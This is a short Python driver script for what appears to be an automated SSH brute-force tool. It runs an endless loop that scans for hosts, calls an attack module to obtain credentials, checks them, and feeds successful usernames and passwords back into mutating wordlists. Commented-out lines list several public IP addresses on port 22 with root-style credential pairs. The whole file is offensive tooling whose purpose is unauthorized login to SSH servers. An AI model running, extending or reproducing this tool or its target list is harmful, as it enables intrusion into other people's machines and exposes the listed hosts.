import logging
import time

from colorama import init, Fore

import core.attack as attack_module
import core.checker as check_module
import core.scan as scan_module
from utility.mutator import Mutator

init()


def time_checker(func):
    def wrapper():
        start_time = time.perf_counter()
        func()
        end_time = time.perf_counter()
        finish = end_time - start_time
        print(f"\n{Fore.GREEN}Finished in {finish} second(s).{Fore.RESET}")

    return wrapper


@time_checker
def work():
    time.sleep(0.1)
    scan = scan_module.Scan()
    info = scan.work()
    attack = attack_module.Attack()
    attack.load_info(info)
    credentials = attack.work()
    check = check_module.Checker()
    # credentials.append(('104.59.75.57', '22', 'test', 'root'))
    # credentials.append(('180.249.111.199', '22', 'root', 'root'))
    # credentials.append(('66.27.219.146', '22', 'root', 'root'))
    # credentials.append(('128.8.25.153', '22', 'root', 'root'))
    check.load_info(credentials)
    result = check.work()
    mutate_pass = Mutator('./data/pass.txt', './data/passfreq.txt')
    mutate_user = Mutator('./data/user.txt', './data/userfreq.txt')
    if result:
        logging.info("Succes! Updating info")
        mutate_pass.update(result[3])
        mutate_user.update(result[2])
    mutate_user.mutate()
    mutate_pass.mutate()
    time.sleep(0.1)


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    logging.getLogger('asyncio').setLevel(logging.WARNING)
    try:
        while True:
            work()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Ctrl + C detected. Stopping..{Fore.RESET}")
    except BaseException as ex:
        logging.critical(ex, exc_info=True)
